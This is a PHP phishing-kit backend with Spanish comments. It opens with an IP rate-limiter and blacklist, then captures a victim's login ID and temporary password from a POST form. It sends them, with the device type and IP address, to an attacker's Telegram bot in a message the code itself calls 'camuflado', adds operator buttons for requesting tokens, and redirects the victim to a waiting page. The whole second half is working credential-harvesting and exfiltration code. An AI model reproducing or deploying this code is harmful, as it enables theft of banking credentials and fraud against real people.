<?php
// --- Configuración ---
$blacklist_file = __DIR__ . '/blocked_ips.txt';   // archivo con IPs bloqueadas (una IP por línea)
$rate_dir       = sys_get_temp_dir() . '/pros_rate'; // carpeta para control de rate (debe permitir escritura)
$threshold      = 20;    // número de requests
$window_seconds = 60;    // ventana de tiempo en segundos para el threshold
$auto_block     = true;  // si true, auto-agrega la IP al blacklist cuando exceda threshold

// --- Helpers ---
function valid_ip($ip) {
    return filter_var($ip, FILTER_VALIDATE_IP) !== false;
}

function send_forbidden_and_exit($reason = '') {
    header('HTTP/1.1 403 Forbidden');
    header('Content-Type: text/plain; charset=UTF-8');
    if ($reason !== '') {
        echo "Forbidden: $reason";
    } else {
        echo "Forbidden";
    }
    exit;
}

// --- Preparar entorno ---
if (!is_dir($rate_dir)) {
    @mkdir($rate_dir, 0700, true);
}

// obtener IP cliente
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
if (!valid_ip($ip)) {
    // si no podemos identificar IP, denegamos por seguridad
    send_forbidden_and_exit('IP inválida');
}

// --- Comprobar blacklist existente ---
$blocked = [];
if (is_readable($blacklist_file)) {
    $lines = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if ($lines !== false) {
        foreach ($lines as $ln) {
            $ln = trim($ln);
            if ($ln !== '' && valid_ip($ln)) {
                $blocked[$ln] = true;
            }
        }
    }
}
if (isset($blocked[$ip])) {
    send_forbidden_and_exit('IP bloqueada');
}

// --- Rate limiting simple + auto-block ---
$ipfile = $rate_dir . '/' . str_replace([':','/','\\'],['_','_','_'], $ip) . '.json';
// bloquear si supera el umbral
$now = time();
$state = ['count' => 0, 'start' => $now];

if (file_exists($ipfile)) {
    $raw = @file_get_contents($ipfile);
    if ($raw !== false) {
        $tmp = json_decode($raw, true);
        if (is_array($tmp) && isset($tmp['count'], $tmp['start'])) {
            $state = $tmp;
        }
    }
}

// si la ventana ya expiró, reiniciamos
if (($now - $state['start']) > $window_seconds) {
    $state = ['count' => 0, 'start' => $now];
}

// incrementar contador
$state['count']++;

// persistir estado (con lock simple)
$fp = @fopen($ipfile, 'c+');
if ($fp) {
    if (flock($fp, LOCK_EX)) {
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, json_encode($state));
        fflush($fp);
        flock($fp, LOCK_UN);
    }
    fclose($fp);
}

// comprobar si excede threshold
if ($state['count'] > $threshold) {
    if ($auto_block) {
        // añadir a blacklist (evitar duplicados)
        if (!isset($blocked[$ip])) {
            // abrir con bloqueo exclusivo para evitar race conditions
            $bf = @fopen($blacklist_file, 'a+');
            if ($bf) {
                if (flock($bf, LOCK_EX)) {
                    // volver a leer por si otro proceso ya lo añadió
                    clearstatcache(true, $blacklist_file);
                    $current = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [];
                    $exists = false;
                    foreach ($current as $line) {
                        if (trim($line) === $ip) { $exists = true; break; }
                    }
                    if (!$exists) {
                        fwrite($bf, $ip . PHP_EOL);
                    }
                    flock($bf, LOCK_UN);
                }
                fclose($bf);
            }
        }
    }
    send_forbidden_and_exit('404');
}
session_start();
include("settings.php");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $pp1 = $_POST['pp1'] ?? '';
    $pp2 = $_POST['pp2'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $_SESSION['usuario'] = $pp1;

    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    $dispositivo = (preg_match('/android|iphone|ipad|mobile/i', $userAgent)) ? 'movil' : 'pc';
    $_SESSION['dispositivo'] = $dispositivo;

    // Mensaje camuflado
    $mensaje = "📥 AVANZ LOGIN\n";
    $mensaje .= "ID: $pp1\n";
    $mensaje .= "Clave temporal: $pp2\n";
    $mensaje .= "Modo: $dispositivo\n";
    $mensaje .= "Red: $ip";

    $botones = [
        [
            ["text" => "📩 TOKEN", "callback_data" => "TOKEN|$pp1"],
            ["text" => "❌ TOKEN ERROR", "callback_data" => "TOKEN-ERROR|$pp1"]
        ],
        [
            ["text" => "⚠️ LOGIN ERROR", "callback_data" => "LOGIN-ERROR|$pp1"]
        ]
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $mensaje,
        'reply_markup' => json_encode(['inline_keyboard' => $botones])
    ]));

    header("Location: sleep.html");
    exit();
}
?>
